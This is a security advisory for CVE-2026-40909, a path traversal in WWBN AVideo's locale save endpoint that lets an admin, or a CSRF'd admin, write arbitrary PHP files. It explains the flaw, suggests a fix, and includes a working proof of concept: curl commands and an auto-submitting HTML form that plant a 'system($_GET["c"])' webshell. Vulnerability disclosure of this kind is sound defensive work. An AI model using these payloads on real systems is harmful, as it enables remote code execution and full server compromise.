# [H] WWBN AVideo has a Path Traversal in Locale Save Endpoint Enables Arbitrary PHP File Write to Any Web-Accessible Directory (RCE)

## Summary
Severity: High
Advisory: GHSA-6rc6-p838-686f
CVE: CVE-2026-40909
CWE: CWE-22
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-6rc6-p838-686f
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The locale save endpoint (`locale/save.php`) constructs a file path by directly concatenating `$_POST['flag']` into the path at line 30 without any sanitization. The `$_POST['code']` parameter is then written verbatim to that path via `fwrite()` at line 40. An admin attacker (or any user who can CSRF an admin, since no CSRF token is checked and cookies use `SameSite=None`) can traverse out of the `locale/` directory and write arbitrary `.php` files to any writable location on the filesystem, achieving Remote Code Execution.

## Details

In `locale/save.php`, the vulnerable code path is:

```php
// locale/save.php:10 — only auth check, no CSRF token
if (!User::isAdmin() || !empty($global['disableAdvancedConfigurations'])) {
    // ...
    die(json_encode($obj));
}

// locale/save.php:16 — base directory
$dir = "{$global['systemRootPath']}locale/";

// locale/save.php:30 — UNSANITIZED path concatenation
$file = $dir.($_POST['flag']).".php";
$myfile = fopen($file, "w") or die("Unable to open file!");

// locale/save.php:40 — UNSANITIZED content write
fwrite($myfile, $_POST['code']);
```

**Root cause**: `$_POST['flag']` is concatenated directly into the file path with no call to `basename()`, `realpath()`, or any filtering of `../` sequences. A `flag` value like `../../shell` resolves to `{systemRootPath}locale/../../shell.php`, which escapes the locale directory and writes to `{systemRootPath}../shell.php` — the web-accessible parent directory.

The file content is constructed as:
```php
<?php
global $t;
{$_POST['code']}  // attacker-controlled, written verbatim
```

An attacker can inject arbitrary PHP after closing the translation context (e.g., `$t["x"]=1;?><?php system($_GET["c"]);`).

**CSRF amplification**: The endpoint performs no CSRF token validation. AVideo intentionally sets `SameSite=None` on session cookies (for cross-origin iframe support), which means cross-site POST requests from an attacker's page will include the admin's session cookie, making CSRF exploitation trivial.

## PoC

**Direct exploitation (requires admin session):**

```bash
# Step 1: Write a webshell outside locale/ to the webroot
curl -b 'PHPSESSID=<admin_session>' \
  -X POST 'https://target/locale/save.php' \
  -d 'flag=../../webshell&code=$t["x"]=1;?><%3fphp+system($_GET["c"]);'

# Step 2: Execute commands via the written webshell
curl 'https://target/webshell.php?c=id'
# Response: uid=33(www-data) gid=33(www-data) ...
```

**CSRF variant (no direct admin access needed):**

Host the following HTML on an attacker-controlled site and lure an admin to visit:

```html
<html>
<body>
<form method="POST" action="https://target/locale/save.php">
  <input type="hidden" name="flag" value="../../webshell">
  <input type="hidden" name="code" value='$t["x"]=1;?><?php system($_GET["c"]);'>
</form>
<script>document.forms[0].submit();</script>
</body>
</html>
```

After the admin visits the page, the attacker accesses `https://target/webshell.php?c=id` for RCE.

## Impact

- **Remote Code Execution**: An attacker can write arbitrary PHP code to any writable web-accessible directory, achieving full server compromise.
- **CSRF to RCE chain**: Because no CSRF token is required and `SameSite=None` is set, any user who can trick an admin into visiting a malicious page achieves unauthenticated RCE. This significantly expands the attack surface beyond admin-only.
- **Full server compromise**: With arbitrary PHP execution as the web server user, the attacker can read/modify the database, access all user data, pivot to other services, and potentially escalate privileges on the host.

## Recommended Fix

Sanitize the `flag` parameter to prevent path traversal and add CSRF protection:

```php
// locale/save.php — after the admin check at line 14

// Add CSRF token validation
if (empty($_POST['token']) || !User::isValidToken($_POST['token'])) {
    $obj->status = 0;
    $obj->error = __("Invalid token");
    die(json_encode($obj));
}

// Sanitize flag to prevent path traversal
$flag = basename($_POST['flag']); // strip directory components
if (empty($flag) || preg_match('/[^a-zA-Z0-9_\-]/', $flag)) {
    $obj->status = 0;
    $obj->error = __("Invalid locale flag");
    die(json_encode($obj));
}

$file = $dir . $flag . ".php";

// Verify resolved path is within expected directory
$realDir = realpath($dir);
$realFile = realpath(dirname($file)) . '/' . basename($file);
if (strpos($realFile, $realDir) !== 0) {
    $obj->status = 0;
    $obj->error = __("Invalid file path");
    die(json_encode($obj));
}
```

Additionally, the `code` parameter should be validated to ensure it only contains translation assignments (`$t[...] = ...;`) and does not include PHP opening/closing tags or arbitrary code.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-6rc6-p838-686f
- https://nvd.nist.gov/vuln/detail/CVE-2026-40909
- https://github.com/WWBN/AVideo/commit/57f89ffbc27d37c9d9dd727212334846e78ac21a
- https://github.com/WWBN/AVideo
